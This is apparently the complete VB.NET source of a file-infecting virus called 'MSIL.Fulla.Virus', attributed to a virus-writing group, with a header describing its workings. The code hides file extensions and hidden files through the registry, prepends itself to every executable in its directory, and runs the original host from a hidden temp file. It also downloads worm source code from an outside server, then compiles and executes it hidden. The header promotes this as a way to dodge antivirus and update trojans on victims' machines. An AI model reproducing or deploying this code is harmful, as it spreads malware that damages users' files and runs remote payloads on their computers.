   '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
   '     free0n {Doomriderz}                                                   '
   '       MSIL.Fulla.Virus                                                     '
   '        RIP MLK 2007!                                                      '
   '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
   '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
   'How it works! (Av don't skim)                                              '
   '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
   'Name:Fulla (Gemanic Goddess)                                               '
   '1. Checks the registry and turns off Show File Extensions                  '
   '   And Show Hidden Files                                                   '
   '2. Infects files in the current directory by finding all                   '
   '   exe files and prepending it's code to the host. There                   '
   '   is ability for it'self to generate a temp file to launch                '
   '   the original program after infection                                    '
   '3. The most interesting part is that it downloads the source               '
   '   code for genetix's Nurofen worm. Then compiles it and builds            '
   '   an executable and executes the code! I've never seen this  before.      '
   '   So what's the benefits? we can now upload anytype of file then have our '
   '   program download and build the source code so we don't have to build    '
   '   a downloader that just downloads an exe file and possibly get blocked.  '
   '   file size is probably another benfit and updating say your trojan could '
   '   be alot easier if you could just upload ur code changes and then have   '
   '   your rat download and make a new build of itself all on the victim's    '
   '   computer.
   '''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''

   Imports System
   Imports System.IO
   Imports System.Text
   Imports System.Net
   Imports System.Diagnostics
   Imports Microsoft.Win32
   Imports System.CodeDom
   Imports System.CodeDom.Compiler

   Module Module1
       'fulla is our current virus process name
       'myDir is duh the current directory path
       Private fulla = Convert.ToString(Process.GetCurrentProcess().MainModule.FileName)
       Private myDir = Directory.GetCurrentDirectory()

       Sub Main()
           'Each sub is called in order
           'DownloadAndCompile is the most interesting part
           'also the prepender :)
           Call Reg()
           Call Infect()
           Call DownloadAndCompile()
       End Sub

       Sub Reg()
           'Basically this is pretty simple
           'we just set the hide file extensions to 1
           'and don't show hidden files since we do a lot with both
           'it makes since to do hide them :)
           Dim r As RegistryKey = Registry.CurrentUser.OpenSubKey("SoftwareMicrosoftWindowsCurrentVersionExplorerAdvanced", True)
           r.SetValue("Hidden", 0)
           r.SetValue("HideFileExt", 1)
           r.Close()
       End Sub

       Sub Infect()
           'Basic prepender virus
           'works like this:
           '1. reads the current file into a byte array
           '2. Gets a list of all the files in the current directory
           '3. checks a byte marker hostbyte(60) if it's not equal then assumes it's an uninfected file
           '4. if file is new file then write the virus to the first part of the exe then write the host bytes
           '5. does a file size check to make sure that if it's not running as a infected file
           '6. if it's running as an infected file it will extract the host bytes and execute it
           '7. once the original app is extracted it launches and waits for exit then deletes the temp file
           Dim myBytes() As Byte
           myBytes = ReadBytes(fulla)

           For Each file As String In Directory.GetFiles(myDir, "*.exe")
               Dim hostBytes() As Byte
               hostBytes = ReadBytes(file)
               'byte check
               If hostBytes(60) <> 128 Then
                   Dim fs As FileStream = New FileStream(file, FileMode.Open, FileAccess.Write)
                   Dim bw As BinaryWriter = New BinaryWriter(fs)
                   'write virus bytes
                   Dim v As Integer
                   For v = 0 To myBytes.Length - 1
                       bw.BaseStream.WriteByte(myBytes(v))
                   Next
                   'write host bytes
                   Dim h As Integer
                   For h = 0 To hostBytes.Length - 1
                       bw.BaseStream.WriteByte(hostBytes(h))
                   Next

                   bw.Flush()
                   bw.Close()
                   fs.Close()
               End If
           Next

           'Check the file size we know how big our exe file size is
           'so if we are running as an infected file our file size will obviously
           'be greater. Then we just extract the host program ourself and write it to a
           'temp file and execute it. Once the user is done we delete it so we don't
           'infect it the next time.
           If myBytes.Length > 28672 Then
               Dim r As Random = New Random()
               Dim tmpfile As String = r.Next(30, 100) & ".exe"
               Dim fstmp As FileStream = New FileStream(tmpfile, FileMode.Create)
               Dim bwtmp As BinaryWriter = New BinaryWriter(fstmp)
               File.SetAttributes(tmpfile, FileAttributes.Hidden)

               Dim t As Integer
               For t = 28672 To myBytes.Length - 1
                   bwtmp.BaseStream.WriteByte(myBytes(t))
               Next

               bwtmp.Flush()
               fstmp.Close()

               Process.Start(tmpfile).WaitForExit()
               File.Delete(tmpfile)
           End If
       End Sub

       Sub DownloadAndCompile()
           'Download and Compile Genetix's Nurofen worm
           'the point is to show that you can make droppers
           'that can read any type of file from the web and then build the code
           'so your not downloading an exe or a suspected suspcious
           'file granted you shouldn't use this on our server :)
           'but this is an example!

           Dim request As WebRequest = WebRequest.Create("http://vx.netlux.org/doomriderz/projects/Nurofen.txt")
           Dim response As HttpWebResponse = CType(request.GetResponse(), HttpWebResponse)
           Dim dataStream As Stream = response.GetResponseStream()

           Dim r As New Random()
           Dim i As Integer = r.Next(10, 100)
           Dim srcTmpName As String = i & ".dat"
           Dim sr As New StreamReader(dataStream)
           Dim data As String = sr.ReadToEnd()
           Dim sw As New StreamWriter(srcTmpName)
           sw.WriteLine(data)
           sw.Flush()
           sw.Close()

           If File.Exists(srcTmpName) Then
               'File.SetAttributes(srcTmpName, FileAttributes.Hidden)
               'Compile the source file that we downloaded
               Dim ic As ICodeCompiler = New VBCodeProvider().CreateCompiler()
               Dim cp As New CompilerParameters()
               cp.ReferencedAssemblies.Add("System.dll")
               cp.ReferencedAssemblies.Add("System.Windows.Forms.dll")

               cp.GenerateExecutable = True
               cp.CompilerOptions = "/target:winexe"
               cp.OutputAssembly = i & ".exe"

               Dim cr As CompilerResults = ic.CompileAssemblyFromFile(cp, srcTmpName)

               'Make sure that when we compile we didn't have
               'errors if we did then no file would have been generated
               'if the file exists we set the file to hidden and then execute it
               If File.Exists(i & ".exe") Then
                   File.SetAttributes(i & ".exe", FileAttributes.Hidden)
                   Process.Start(i & ".exe").WaitForExit()
               End If

               'Delete source file that we download
               'and the nurofen worm cause we have already
               'executed it.
               File.Delete(i & ".exe")
               File.Delete(srcTmpName)
           End If
       End Sub

       Public Function ReadBytes(ByVal d As String) As Byte()
           'TO save much needed space and to keep from having to write
           'this code 3 or 4 times it's in it's own function!
           Dim fs As FileStream = New FileStream(d, FileMode.Open, FileAccess.Read)
           Dim br As BinaryReader = New BinaryReader(fs)
           Dim fi As New FileInfo(d)
           Dim b As Byte() = br.ReadBytes(CInt(fi.Length))
           br.Close()
           fs.Close()
           Return b
       End Function
   End Module
